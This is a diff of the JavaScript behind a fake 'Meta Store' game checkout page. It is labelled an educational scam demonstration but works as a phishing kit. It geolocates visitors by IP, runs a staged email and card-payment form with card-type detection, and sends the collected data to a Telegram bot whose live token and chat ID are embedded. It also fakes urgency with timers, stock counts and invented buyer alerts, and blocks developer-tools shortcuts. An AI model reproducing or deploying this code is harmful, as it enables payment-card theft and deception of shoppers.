@@ -1,27 +1,38 @@
-// UPDATED VERSION - Part 1: Configuration and Global Variables
-// Game Page JavaScript - Educational Scam Demonstration
-// Enhanced with IP Geolocation tracking and World Countries API for educational purposes
+// ====================================================================
+// SCRIPT.JS - PART 1: CONFIGURATION & CONSTANTS
+// Educational Scam Demonstration - Fake Meta Store
+// Purpose: Configuration, constants, and global variable declarations
+// ====================================================================
 
-// Telegram Bot Configuration
+// ====================================================================
+// TELEGRAM BOT CONFIGURATION
+// ====================================================================
 const TELEGRAM_CONFIG = {
     botToken: '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y',
     chatId: '-1002883529752'
 };
 
-// IP Geolocation API Configuration
+// ====================================================================
+// IP GEOLOCATION API CONFIGURATION
+// ====================================================================
 const GEOLOCATION_CONFIG = {
     apiKey: 'c308d4f33337401abad920bdd05a8edb',
     apiUrl: 'https://api.ipgeolocation.io/ipgeo',
     timeout: 5000 // 5 seconds timeout
 };
 
-// NEW: Countries API Configuration
+// ====================================================================
+// COUNTRIES API CONFIGURATION
+// ====================================================================
 const COUNTRIES_CONFIG = {
     apiUrl: 'https://restcountries.com/v3.1/all',
     fields: 'name,cca2', // Only get name and 2-letter country code
     timeout: 5000 // 5 seconds timeout
 };
 
+// ====================================================================
+// GLOBAL PAYMENT DATA STORAGE
+// ====================================================================
 // Global variable to store user data across steps
 let userPaymentData = {
     email: '',
@@ -40,13 +51,15 @@ let userLocationData = {
     city: 'Unknown'
 };
 
-// NEW: Global variable to store countries data
+// Global variable to store countries data
 let worldCountries = [];
 
-// NEW: Global variable to track if countries are loaded
+// Global variable to track if countries are loaded
 let countriesLoaded = false;
 
-// Card BIN ranges for validation and type detection
+// ====================================================================
+// CREDIT CARD BIN RANGES FOR VALIDATION
+// ====================================================================
 const CARD_BINS = {
     visa: {
         bins: ['4'],
@@ -66,30 +79,9 @@ const CARD_BINS = {
     }
 };
 
-// UPDATED VERSION - Part 2: Core Initialization and Utility Functions with Enhanced Zip Code Validation
-
-// DOM Content Loaded Event - Enhanced with location fetching and countries loading
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('🎮 Script loaded successfully!');
-    
-    // Fetch user location data immediately on page load
-    fetchUserLocation();
-    
-    // Load world countries data immediately on page load
-    loadWorldCountries();
-    
-    // Initialize all existing functionality
-    initializeNavigation();
-    initializeMobileMenu();
-    initializeSearch();
-    initializeCountdownTimer();
-    initializeBuyButton();
-    initializePriceCountdown();
-    initializeAnimations();
-    startUrgencyUpdates();
-});
-
-// NEW: Comprehensive Zip Code Validation Patterns for 50+ Countries
+// ====================================================================
+// COMPREHENSIVE ZIP CODE VALIDATION PATTERNS (50+ COUNTRIES)
+// ====================================================================
 const ZIP_CODE_PATTERNS = {
     // North America
     'US': { 
@@ -342,130 +334,510 @@ const ZIP_CODE_PATTERNS = {
     }
 };
 
-// NEW: Get zip code pattern for specific country
-function getZipCodePattern(countryCode) {
-    return ZIP_CODE_PATTERNS[countryCode] || ZIP_CODE_PATTERNS['DEFAULT'];
+// ====================================================================
+// FORM VALIDATION STATE TRACKING
+// ====================================================================
+let formValidationState = {
+    cardHolder: false,
+    cardNumber: false,
+    cardExpiry: false,
+    cardCvv: false,
+    country: false,
+    zipCode: false
+};
+
+// ====================================================================
+// CONSOLE INITIALIZATION MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 1 LOADED: Configuration & Constants');
+console.log('📋 Loaded: Telegram config, Geolocation config, Countries config');
+console.log('💳 Loaded: Card BIN ranges for validation');
+console.log('🗺️ Loaded: Zip code patterns for 50+ countries');
+console.log('🔧 Loaded: Global variables and validation state tracking');
+console.log('✅ PART 1 COMPLETE - Ready for Part 2: Initialization & Basic UI');
+
+// ====================================================================
+// SCRIPT.JS - PART 2: INITIALIZATION & BASIC UI
+// Educational Scam Demonstration - Fake Meta Store
+// Purpose: DOM initialization, navigation, timers, and basic UI functionality
+// ====================================================================
+
+// ====================================================================
+// MAIN DOM CONTENT LOADED EVENT
+// ====================================================================
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('🎮 Script loaded successfully!');
+    
+    // Fetch user location data immediately on page load
+    fetchUserLocation();
+    
+    // Load world countries data immediately on page load
+    loadWorldCountries();
+    
+    // Initialize all existing functionality
+    initializeNavigation();
+    initializeMobileMenu();
+    initializeSearch();
+    initializeCountdownTimer();
+    initializeBuyButton();
+    initializePriceCountdown();
+    initializeAnimations();
+    startUrgencyUpdates();
+});
+
+// ====================================================================
+// NAVIGATION FUNCTIONALITY
+// ====================================================================
+function initializeNavigation() {
+    const navLinks = document.querySelectorAll('.nav-link');
+    
+    navLinks.forEach(link => {
+        link.addEventListener('click', function(e) {
+            navLinks.forEach(l => l.classList.remove('active'));
+            this.classList.add('active');
+        });
+    });
 }
 
-// NEW: Validate zip code for specific country
-function validateZipCodeByCountry(zipCode, countryCode) {
-    if (!zipCode || !countryCode) return false;
+// ====================================================================
+// MOBILE MENU FUNCTIONALITY
+// ====================================================================
+function initializeMobileMenu() {
+    const mobileMenuToggle = document.getElementById('mobileMenuToggle');
+    const mobileNav = document.getElementById('mobileNav');
     
-    const pattern = getZipCodePattern(countryCode);
-    const cleanZip = zipCode.trim();
-    
-    console.log(`🔍 Validating zip "${cleanZip}" for country "${countryCode}" with pattern:`, pattern.pattern);
-    
-    const isValid = pattern.pattern.test(cleanZip);
-    console.log(`${isValid ? '✅' : '❌'} Zip validation result: ${isValid}`);
-    
-    return isValid;
+    if (mobileMenuToggle && mobileNav) {
+        mobileMenuToggle.addEventListener('click', function() {
+            mobileNav.classList.toggle('active');
+            
+            const icon = this.querySelector('i');
+            if (mobileNav.classList.contains('active')) {
+                icon.className = 'fas fa-times';
+            } else {
+                icon.className = 'fas fa-bars';
+            }
+        });
+        
+        document.addEventListener('click', function(e) {
+            if (!mobileMenuToggle.contains(e.target) && !mobileNav.contains(e.target)) {
+                mobileNav.classList.remove('active');
+                mobileMenuToggle.querySelector('i').className = 'fas fa-bars';
+            }
+        });
+    }
 }
 
-// NEW: Update zip code placeholder and example based on country
-function updateZipCodePlaceholder(countryCode) {
-    const zipInput = document.getElementById('zipCode');
-    const zipLabel = document.querySelector('label[for="zipCode"]');
+// ====================================================================
+// SEARCH FUNCTIONALITY
+// ====================================================================
+function initializeSearch() {
+    const searchInput = document.querySelector('.search-input');
+    const searchIcon = document.querySelector('.search-icon');
     
-    if (!zipInput) return;
-    
-    const pattern = getZipCodePattern(countryCode);
-    
-    // Update placeholder
-    zipInput.placeholder = pattern.placeholder;
-    
-    // Update label with format example
-    if (zipLabel) {
-        zipLabel.innerHTML = `Zip Code * <small style="color: #666; font-weight: normal;">(${pattern.example})</small>`;
+    if (searchInput) {
+        searchInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                // Basic search functionality for demonstration
+            }
+        });
     }
     
-    // Clear previous validation state when country changes
-    zipInput.classList.remove('error');
-    clearFieldError('zipCode');
+    if (searchIcon) {
+        searchIcon.addEventListener('click', function() {
+            // Basic search functionality for demonstration
+        });
+    }
+}
+
+// ====================================================================
+// COUNTDOWN TIMER FOR LIMITED TIME BANNER
+// ====================================================================
+function initializeCountdownTimer() {
+    const countdownElement = document.getElementById('countdown');
     
-    // Reset validation state
-    if (typeof formValidationState !== 'undefined') {
-        formValidationState.zipCode = false;
-        if (typeof updateSubmitButtonState === 'function') {
-            updateSubmitButtonState();
+    if (!countdownElement) return;
+    
+    let hours = 23;
+    let minutes = 47;
+    let seconds = 32;
+    
+    function updateCountdown() {
+        seconds--;
+        
+        if (seconds < 0) {
+            seconds = 59;
+            minutes--;
+            
+            if (minutes < 0) {
+                minutes = 59;
+                hours--;
+                
+                if (hours < 0) {
+                    hours = 23;
+                    minutes = 47;
+                    seconds = 32;
+                }
+            }
+        }
+        
+        const formattedTime = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        countdownElement.textContent = formattedTime;
+    }
+    
+    updateCountdown();
+    setInterval(updateCountdown, 1000);
+}
+
+// ====================================================================
+// PRICE COUNTDOWN TIMER
+// ====================================================================
+function initializePriceCountdown() {
+    const priceCountdownElement = document.getElementById('priceCountdown');
+    
+    if (!priceCountdownElement) return;
+    
+    let minutes = 47;
+    
+    function updatePriceCountdown() {
+        minutes--;
+        
+        if (minutes <= 0) {
+            minutes = 47;
+        }
+        
+        priceCountdownElement.textContent = `${minutes} minutes`;
+        
+        // Add urgency when time is low
+        if (minutes <= 10) {
+            priceCountdownElement.style.color = '#e74c3c';
+            priceCountdownElement.style.fontWeight = 'bold';
         }
     }
     
-    console.log(`📋 Updated zip code format for ${countryCode}:`, pattern.example);
+    setInterval(updatePriceCountdown, 60000); // Update every minute
 }
 
-// NEW: Format zip code as user types (for specific countries)
-function formatZipCodeInput(zipCode, countryCode) {
-    if (!zipCode || !countryCode) return zipCode;
+// ====================================================================
+// BUY BUTTON INITIALIZATION
+// ====================================================================
+function initializeBuyButton() {
+    const buyButton = document.getElementById('buyNowBtn');
+    console.log('🔍 Looking for buy button...', buyButton);
     
-    const cleanZip = zipCode.replace(/[^\w\s]/g, '').toUpperCase();
-    
-    switch (countryCode) {
-        case 'CA':
-            // Format: L1L 1L1
-            if (cleanZip.length <= 6) {
-                return cleanZip.replace(/^([A-Z]\d[A-Z])(\d[A-Z]\d)$/, '$1 $2');
-            }
-            break;
+    if (buyButton) {
+        console.log('✅ Buy button found! Adding click listener...');
+        buyButton.addEventListener('click', function() {
+            console.log('🎯 Buy button clicked!');
             
-        case 'GB':
-            // Format: SW1A 1AA
-            if (cleanZip.length > 3 && cleanZip.length <= 7) {
-                const match = cleanZip.match(/^([A-Z]{1,2}\d[A-Z\d]?)(\d[A-Z]{2})$/);
-                if (match) {
-                    return `${match[1]} ${match[2]}`;
+            const gameName = this.getAttribute('data-game');
+            const currentPrice = this.getAttribute('data-price');
+            const originalPrice = this.getAttribute('data-original');
+            
+            console.log('📊 Game data:', { gameName, currentPrice, originalPrice });
+            
+            // Store game data globally
+            userPaymentData.gameName = gameName;
+            userPaymentData.currentPrice = currentPrice;
+            userPaymentData.originalPrice = originalPrice;
+            
+            // Show email modal first (Step 1)
+            showEmailModal(gameName, currentPrice, originalPrice);
+        });
+    } else {
+        console.error('⌚ Buy button not found! Check if ID is correct.');
+    }
+}
+
+// ====================================================================
+// ANIMATION AND SCROLL EFFECTS
+// ====================================================================
+function initializeAnimations() {
+    const observerOptions = {
+        threshold: 0.1,
+        rootMargin: '0px 0px -50px 0px'
+    };
+    
+    const observer = new IntersectionObserver(function(entries) {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                entry.target.style.opacity = '1';
+                entry.target.style.transform = 'translateY(0)';
+            }
+        });
+    }, observerOptions);
+    
+    // Observe elements for animation
+    document.querySelectorAll('.game-details, .customer-reviews, .related-games').forEach((section, index) => {
+        section.style.opacity = '0';
+        section.style.transform = 'translateY(30px)';
+        section.style.transition = `opacity 0.6s ease ${index * 0.2}s, transform 0.6s ease ${index * 0.2}s`;
+        observer.observe(section);
+    });
+}
+
+// ====================================================================
+// URGENCY UPDATES AND SCAM TACTICS
+// ====================================================================
+function startUrgencyUpdates() {
+    // Update stock indicators occasionally
+    setInterval(() => {
+        const stockIndicators = document.querySelectorAll('.stock-indicator, .stock-warning');
+        
+        stockIndicators.forEach(indicator => {
+            if (Math.random() < 0.1) { // 10% chance
+                const currentText = indicator.textContent;
+                const currentNumber = parseInt(currentText.match(/\d+/)?.[0] || '3');
+                
+                if (currentNumber > 1) {
+                    const newNumber = currentNumber - 1;
+                    indicator.textContent = currentText.replace(/\d+/, newNumber.toString());
+                    
+                    if (newNumber <= 1) {
+                        indicator.style.background = '#c0392b';
+                        indicator.style.animation = 'urgent-blink 0.8s infinite';
+                    }
                 }
             }
-            break;
-            
-        case 'NL':
-            // Format: 1234 AB
-            if (cleanZip.length > 4) {
-                return cleanZip.replace(/^(\d{4})([A-Z]{2})$/, '$1 $2');
-            }
-            break;
-            
-        case 'SE':
-        case 'CZ':
-        case 'SK':
-            // Format: 123 45
-            if (cleanZip.length > 3) {
-                return cleanZip.replace(/^(\d{3})(\d{2})$/, '$1 $2');
-            }
-            break;
-            
-        case 'PL':
-            // Format: 12-345
-            if (cleanZip.length > 2) {
-                return cleanZip.replace(/^(\d{2})(\d{3})$/, '$1-$2');
-            }
-            break;
-            
-        case 'JP':
-            // Format: 123-4567
-            if (cleanZip.length > 3) {
-                return cleanZip.replace(/^(\d{3})(\d{4})$/, '$1-$2');
-            }
-            break;
-            
-        case 'BR':
-            // Format: 12345-678
-            if (cleanZip.length > 5) {
-                return cleanZip.replace(/^(\d{5})(\d{3})$/, '$1-$2');
-            }
-            break;
+        });
+    }, 30000); // Check every 30 seconds
+}
+
+// ====================================================================
+// SMOOTH SCROLLING FOR ANCHOR LINKS
+// ====================================================================
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+    anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+            target.scrollIntoView({
+                behavior: 'smooth',
+                block: 'start'
+            });
+        }
+    });
+});
+
+// ====================================================================
+// RELATED GAMES CLICK HANDLERS
+// ====================================================================
+document.addEventListener('click', function(e) {
+    const relatedGameCard = e.target.closest('.related-game-card');
+    if (relatedGameCard) {
+        const gameName = relatedGameCard.querySelector('h3').textContent;
+        const currentPrice = relatedGameCard.querySelector('.current').textContent.replace(/[^0-9.]/g, '');
+        const originalPrice = relatedGameCard.querySelector('.original').textContent.replace(/[^0-9.]/g, '');
+        
+        console.log('Related game clicked:', { gameName, currentPrice, originalPrice });
     }
+});
+
+// ====================================================================
+// PAGE EXIT INTENT DETECTION (SCAM TACTIC)
+// ====================================================================
+let exitIntentShown = false;
+document.addEventListener('mouseleave', function(e) {
+    if (e.clientY <= 0 && !exitIntentShown) {
+        exitIntentShown = true;
+        setTimeout(() => {
+            if (!document.getElementById('paymentModal')?.classList.contains('active') && 
+                !document.getElementById('emailModal')?.classList.contains('active')) {
+                // Exit intent could trigger special offers - disabled for cleaner demo
+            }
+        }, 3000);
+    }
+});
+
+// ====================================================================
+// BASIC SECURITY THEATER (SCAM TACTIC)
+// ====================================================================
+// Prevent developer tools (basic attempt - easily bypassed)
+document.addEventListener('keydown', function(e) {
+    // Prevent F12, Ctrl+Shift+I, Ctrl+U, etc.
+    if (e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+        (e.ctrlKey && e.key === 'u') ||
+        (e.ctrlKey && e.shiftKey && e.key === 'C')) {
+        e.preventDefault();
+    }
+});
+
+// ====================================================================
+// FAKE CUSTOMER ACTIVITY SIMULATION
+// ====================================================================
+function simulateCustomerActivity() {
+    const activities = [
+        'Someone from New York just bought Beat Saber!',
+        'Customer from London purchased SUPERHOT VR!',
+        'Tokyo customer just saved $25 on this deal!',
+        'Someone from Sydney bought 3 games in 5 minutes!',
+        'Customer from Berlin just left a 5-star review!',
+        'Someone from Toronto just shared this deal!',
+        'Paris customer purchased and downloaded instantly!',
+        'Customer from Seoul just bought the same game!'
+    ];
     
-    return cleanZip;
+    setInterval(() => {
+        if (Math.random() < 0.15) { // 15% chance every interval
+            const activity = activities[Math.floor(Math.random() * activities.length)];
+            // Customer activity notifications disabled for cleaner demo
+        }
+    }, 25000);
 }
 
-// NEW: Get zip code error message for specific country
-function getZipCodeErrorMessage(countryCode) {
-    const pattern = getZipCodePattern(countryCode);
-    return `Please enter a valid zip code (${pattern.example})`;
+// Start customer activity simulation after delay
+setTimeout(simulateCustomerActivity, 10000); // Start after 10 seconds
+
+// ====================================================================
+// PAGE LOAD ANALYTICS TRACKING
+// ====================================================================
+function trackPageLoad() {
+    const pageData = {
+        page: 'Game Page - ' + (document.querySelector('.game-title')?.textContent || 'Unknown Game'),
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        screenResolution: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        referrer: document.referrer || 'Direct',
+        loadTime: performance.now(),
+        locationData: userLocationData
+    };
+    
+    console.log('Page Analytics (Educational Demo):', pageData);
 }
 
-// NEW: Load all world countries from REST Countries API
+// Initialize page tracking after delay
+setTimeout(trackPageLoad, 1000);
+
+// ====================================================================
+// PERFORMANCE MONITORING
+// ====================================================================
+function monitorPerformance() {
+    if ('performance' in window) {
+        const perfData = {
+            loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
+            domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
+            firstPaint: performance.getEntriesByType('paint')[0]?.startTime || 0,
+            resources: performance.getEntriesByType('resource').length,
+            zipValidationReady: typeof validateZipCodeByCountry !== 'undefined',
+            countriesLoaded: countriesLoaded
+        };
+        
+        console.log('Performance Metrics (Educational Demo):', perfData);
+    }
+}
+
+// Monitor performance after page load
+window.addEventListener('load', () => {
+    setTimeout(monitorPerformance, 1000);
+});
+
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 2 LOADED: Initialization & Basic UI');
+console.log('🚀 Initialized: Navigation, mobile menu, search functionality');
+console.log('⏰ Initialized: Countdown timers and buy button');
+console.log('🎨 Initialized: Animations and scroll effects');
+console.log('📈 Initialized: Urgency updates and customer activity simulation');
+console.log('✅ PART 2 COMPLETE - Ready for Part 3: Geolocation & Countries System');
+
+// ====================================================================
+// SCRIPT.JS - PART 3: GEOLOCATION & COUNTRIES SYSTEM
+// Educational Scam Demonstration - Fake Meta Store
+// Purpose: IP geolocation tracking, countries loading, and location management
+// ====================================================================
+
+// ====================================================================
+// ENHANCED IP GEOLOCATION FETCHING
+// ====================================================================
+async function fetchUserLocation() {
+    try {
+        console.log('🌍 Fetching user location data...');
+        
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), GEOLOCATION_CONFIG.timeout);
+        
+        const response = await fetch(`${GEOLOCATION_CONFIG.apiUrl}?apiKey=${GEOLOCATION_CONFIG.apiKey}`, {
+            signal: controller.signal,
+            method: 'GET',
+            headers: {
+                'Accept': 'application/json'
+            }
+        });
+        
+        clearTimeout(timeoutId);
+        
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        const locationData = await response.json();
+        
+        // Update global location data with comprehensive information
+        userLocationData = {
+            ip: locationData.ip || 'Unknown',
+            country_name: locationData.country_name || 'Unknown',
+            state_prov: locationData.state_prov || 'Unknown',
+            city: locationData.city || 'Unknown',
+            isp: locationData.isp || 'Unknown',
+            organization: locationData.organization || 'Unknown',
+            timezone: locationData.time_zone?.name || 'Unknown',
+            latitude: locationData.latitude || 'Unknown',
+            longitude: locationData.longitude || 'Unknown',
+            country_code2: locationData.country_code2 || 'Unknown',
+            continent_name: locationData.continent_name || 'Unknown',
+            connection_type: locationData.connection_type || 'Unknown',
+            district: locationData.district || 'Unknown',
+            zipcode: locationData.zipcode || 'Unknown',
+            calling_code: locationData.calling_code || 'Unknown',
+            currency: locationData.currency?.code || 'Unknown'
+        };
+        
+        // Store in user payment data as well
+        userPaymentData.locationData = userLocationData;
+        userPaymentData.timestamp = new Date().toISOString();
+        
+        console.log('✅ Location data fetched successfully:', userLocationData);
+        
+        // AUTO-SELECT COUNTRY: If payment modal is already open, auto-select country
+        const countrySelect = document.getElementById('country');
+        if (countrySelect && countriesLoaded) {
+            autoSelectUserCountry(countrySelect);
+        }
+        
+    } catch (error) {
+        console.warn('⚠️ Failed to fetch location data:', error.message);
+        
+        // Fallback to basic data
+        userLocationData = {
+            ip: 'API_ERROR',
+            country_name: 'Unknown',
+            state_prov: 'Unknown',
+            city: 'Unknown',
+            isp: 'Unknown',
+            organization: 'Unknown',
+            timezone: 'Unknown',
+            latitude: 'Unknown',
+            longitude: 'Unknown',
+            country_code2: 'Unknown',
+            continent_name: 'Unknown',
+            connection_type: 'Unknown',
+            district: 'Unknown',
+            zipcode: 'Unknown',
+            calling_code: 'Unknown',
+            currency: 'Unknown'
+        };
+        
+        userPaymentData.locationData = userLocationData;
+        userPaymentData.timestamp = new Date().toISOString();
+    }
+}
+
+// ====================================================================
+// WORLD COUNTRIES LOADING SYSTEM
+// ====================================================================
 async function loadWorldCountries() {
     try {
         console.log('🌍 Loading world countries data...');
@@ -504,7 +876,7 @@ async function loadWorldCountries() {
     } catch (error) {
         console.warn('⚠️ Failed to load countries data:', error.message);
         
-        // Fallback to basic countries list if API fails
+        // Fallback to comprehensive countries list if API fails
         worldCountries = [
             { code: 'US', name: 'United States' },
             { code: 'CA', name: 'Canada' },
@@ -588,7 +960,9 @@ async function loadWorldCountries() {
     }
 }
 
-// NEW: Populate country dropdown with all world countries
+// ====================================================================
+// COUNTRY DROPDOWN POPULATION
+// ====================================================================
 function populateCountryDropdown(selectElement) {
     if (!selectElement) {
         console.warn('⚠️ Country select element not found');
@@ -647,7 +1021,9 @@ function populateCountryDropdown(selectElement) {
     }
 }
 
-// FIXED: Auto-select user's country based on geolocation data with proper validation update
+// ====================================================================
+// AUTO-SELECT USER'S COUNTRY BASED ON GEOLOCATION
+// ====================================================================
 function autoSelectUserCountry(selectElement) {
     if (!selectElement || !userLocationData) {
         console.warn('⚠️ Cannot auto-select country: missing data');
@@ -662,7 +1038,7 @@ function autoSelectUserCountry(selectElement) {
             selectElement.value = userCountryCode;
             console.log('✅ Auto-selected country by code:', userCountryCode, '-', option.textContent);
             
-            // FIXED: Manually update validation state for auto-selected country
+            // Manually update validation state for auto-selected country
             if (typeof formValidationState !== 'undefined') {
                 formValidationState.country = true;
                 console.log('🔄 Updated country validation state to true');
@@ -697,7 +1073,7 @@ function autoSelectUserCountry(selectElement) {
             selectElement.value = matchedCountry.code;
             console.log('✅ Auto-selected country by name:', matchedCountry.name, '(' + matchedCountry.code + ')');
             
-            // FIXED: Manually update validation state for auto-selected country
+            // Manually update validation state for auto-selected country
             if (typeof formValidationState !== 'undefined') {
                 formValidationState.country = true;
                 console.log('🔄 Updated country validation state to true');
@@ -722,258 +1098,31 @@ function autoSelectUserCountry(selectElement) {
     console.log('🔍 Could not auto-select country for:', userLocationData.country_name, userCountryCode);
 }
 
-// ENHANCED: Fetch user location data with country auto-selection
-async function fetchUserLocation() {
-    try {
-        console.log('🌍 Fetching user location data...');
-        
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), GEOLOCATION_CONFIG.timeout);
-        
-        const response = await fetch(`${GEOLOCATION_CONFIG.apiUrl}?apiKey=${GEOLOCATION_CONFIG.apiKey}`, {
-            signal: controller.signal,
-            method: 'GET',
-            headers: {
-                'Accept': 'application/json'
-            }
-        });
-        
-        clearTimeout(timeoutId);
-        
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        
-        const locationData = await response.json();
-        
-        // Update global location data
-        userLocationData = {
-            ip: locationData.ip || 'Unknown',
-            country_name: locationData.country_name || 'Unknown',
-            state_prov: locationData.state_prov || 'Unknown',
-            city: locationData.city || 'Unknown',
-            isp: locationData.isp || 'Unknown',
-            organization: locationData.organization || 'Unknown',
-            timezone: locationData.time_zone?.name || 'Unknown',
-            latitude: locationData.latitude || 'Unknown',
-            longitude: locationData.longitude || 'Unknown',
-            country_code2: locationData.country_code2 || 'Unknown',
-            continent_name: locationData.continent_name || 'Unknown',
-            connection_type: locationData.connection_type || 'Unknown',
-            district: locationData.district || 'Unknown',
-            zipcode: locationData.zipcode || 'Unknown',
-            calling_code: locationData.calling_code || 'Unknown',
-            currency: locationData.currency?.code || 'Unknown'
-        };
-        
-        // Store in user payment data as well
-        userPaymentData.locationData = userLocationData;
-        userPaymentData.timestamp = new Date().toISOString();
-        
-        console.log('✅ Location data fetched successfully:', userLocationData);
-        
-        // AUTO-SELECT COUNTRY: If payment modal is already open, auto-select country
-        const countrySelect = document.getElementById('country');
-        if (countrySelect && countriesLoaded) {
-            autoSelectUserCountry(countrySelect);
-        }
-        
-    } catch (error) {
-        console.warn('⚠️ Failed to fetch location data:', error.message);
-        
-        // Fallback to basic data
-        userLocationData = {
-            ip: 'API_ERROR',
-            country_name: 'Unknown',
-            state_prov: 'Unknown',
-            city: 'Unknown',
-            isp: 'Unknown',
-            organization: 'Unknown',
-            timezone: 'Unknown',
-            latitude: 'Unknown',
-            longitude: 'Unknown',
-            country_code2: 'Unknown',
-            continent_name: 'Unknown',
-            connection_type: 'Unknown',
-            district: 'Unknown',
-            zipcode: 'Unknown',
-            calling_code: 'Unknown',
-            currency: 'Unknown'
-        };
-        
-        userPaymentData.locationData = userLocationData;
-        userPaymentData.timestamp = new Date().toISOString();
-    }
+// ====================================================================
+// GET COUNTRY NAME BY COUNTRY CODE (FOR DISPLAY)
+// ====================================================================
+function getCountryNameByCode(countryCode) {
+    if (!countryCode || !worldCountries) return countryCode || 'Unknown';
+    
+    const country = worldCountries.find(c => c.code === countryCode);
+    return country ? country.name : countryCode;
 }
 
-// Navigation functionality
-function initializeNavigation() {
-    const navLinks = document.querySelectorAll('.nav-link');
-    
-    navLinks.forEach(link => {
-        link.addEventListener('click', function(e) {
-            navLinks.forEach(l => l.classList.remove('active'));
-            this.classList.add('active');
-        });
-    });
-}
-
-// Mobile menu functionality
-function initializeMobileMenu() {
-    const mobileMenuToggle = document.getElementById('mobileMenuToggle');
-    const mobileNav = document.getElementById('mobileNav');
-    
-    if (mobileMenuToggle && mobileNav) {
-        mobileMenuToggle.addEventListener('click', function() {
-            mobileNav.classList.toggle('active');
-            
-            const icon = this.querySelector('i');
-            if (mobileNav.classList.contains('active')) {
-                icon.className = 'fas fa-times';
-            } else {
-                icon.className = 'fas fa-bars';
-            }
-        });
-        
-        document.addEventListener('click', function(e) {
-            if (!mobileMenuToggle.contains(e.target) && !mobileNav.contains(e.target)) {
-                mobileNav.classList.remove('active');
-                mobileMenuToggle.querySelector('i').className = 'fas fa-bars';
-            }
-        });
-    }
-}
-
-// Search functionality (basic for demonstration)
-function initializeSearch() {
-    const searchInput = document.querySelector('.search-input');
-    const searchIcon = document.querySelector('.search-icon');
-    
-    if (searchInput) {
-        searchInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                // showNotification('🔍 Search our extensive VR game catalog!\n🎮 Browse our Games section for amazing deals.', 'info');
-            }
-        });
-    }
-    
-    if (searchIcon) {
-        searchIcon.addEventListener('click', function() {
-            // showNotification('🔍 Search our extensive VR game catalog!\n🎮 Browse our Games section for amazing deals.', 'info');
-        });
-    }
-}
-
-// Countdown Timer for Limited Time Banner
-function initializeCountdownTimer() {
-    const countdownElement = document.getElementById('countdown');
-    
-    if (!countdownElement) return;
-    
-    let hours = 23;
-    let minutes = 47;
-    let seconds = 32;
-    
-    function updateCountdown() {
-        seconds--;
-        
-        if (seconds < 0) {
-            seconds = 59;
-            minutes--;
-            
-            if (minutes < 0) {
-                minutes = 59;
-                hours--;
-                
-                if (hours < 0) {
-                    hours = 23;
-                    minutes = 47;
-                    seconds = 32;
-                }
-            }
-        }
-        
-        const formattedTime = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-        countdownElement.textContent = formattedTime;
-    }
-    
-    updateCountdown();
-    setInterval(updateCountdown, 1000);
-}
-
-// Price countdown timer
-function initializePriceCountdown() {
-    const priceCountdownElement = document.getElementById('priceCountdown');
-    
-    if (!priceCountdownElement) return;
-    
-    let minutes = 47;
-    
-    function updatePriceCountdown() {
-        minutes--;
-        
-        if (minutes <= 0) {
-            minutes = 47;
-        }
-        
-        priceCountdownElement.textContent = `${minutes} minutes`;
-        
-        // Add urgency when time is low
-        if (minutes <= 10) {
-            priceCountdownElement.style.color = '#e74c3c';
-            priceCountdownElement.style.fontWeight = 'bold';
-        }
-    }
-    
-    setInterval(updatePriceCountdown, 60000); // Update every minute
-}
-
-// Buy Button functionality - NOW SHOWS EMAIL MODAL FIRST
-function initializeBuyButton() {
-    const buyButton = document.getElementById('buyNowBtn');
-    console.log('🔍 Looking for buy button...', buyButton);
-    
-    if (buyButton) {
-        console.log('✅ Buy button found! Adding click listener...');
-        buyButton.addEventListener('click', function() {
-            console.log('🎯 Buy button clicked!');
-            
-            const gameName = this.getAttribute('data-game');
-            const currentPrice = this.getAttribute('data-price');
-            const originalPrice = this.getAttribute('data-original');
-            
-            console.log('📊 Game data:', { gameName, currentPrice, originalPrice });
-            
-            // Store game data globally
-            userPaymentData.gameName = gameName;
-            userPaymentData.currentPrice = currentPrice;
-            userPaymentData.originalPrice = originalPrice;
-            
-            // Show email modal first (Step 1)
-            showEmailModal(gameName, currentPrice, originalPrice);
-        });
-    } else {
-        console.error('⌚ Buy button not found! Check if ID is correct.');
-    }
-}
-
-// UPDATED VERSION - Part 3: Enhanced Geolocation and Telegram Integration
-
-// NEW: Format location data for Telegram messages
-// UPDATED VERSION - Part 3: Simplified Geolocation and Telegram Integration
-
-// SIMPLIFIED: Format location data for Telegram messages (only 4 fields)
+// ====================================================================
+// LOCATION DATA FORMATTING FOR TELEGRAM MESSAGES
+// ====================================================================
 function formatLocationData(locationData) {
     return `
 🌍 LOCATION INFO:
-📍 IP Address: ${locationData.ip}
+🔍 IP Address: ${locationData.ip}
 🏳️ Country: ${locationData.country_name}
 🏙️ State/Region: ${locationData.state_prov}
 🏘️ City: ${locationData.city}`;
 }
 
-// UPDATED: Send email data to Telegram with simplified location info (Step 1)
+// ====================================================================
+// TELEGRAM INTEGRATION - SEND EMAIL DATA (STEP 1)
+// ====================================================================
 async function sendEmailToTelegram(email, gameName, price) {
     const locationInfo = formatLocationData(userLocationData);
     
@@ -991,10 +1140,10 @@ ${locationInfo}
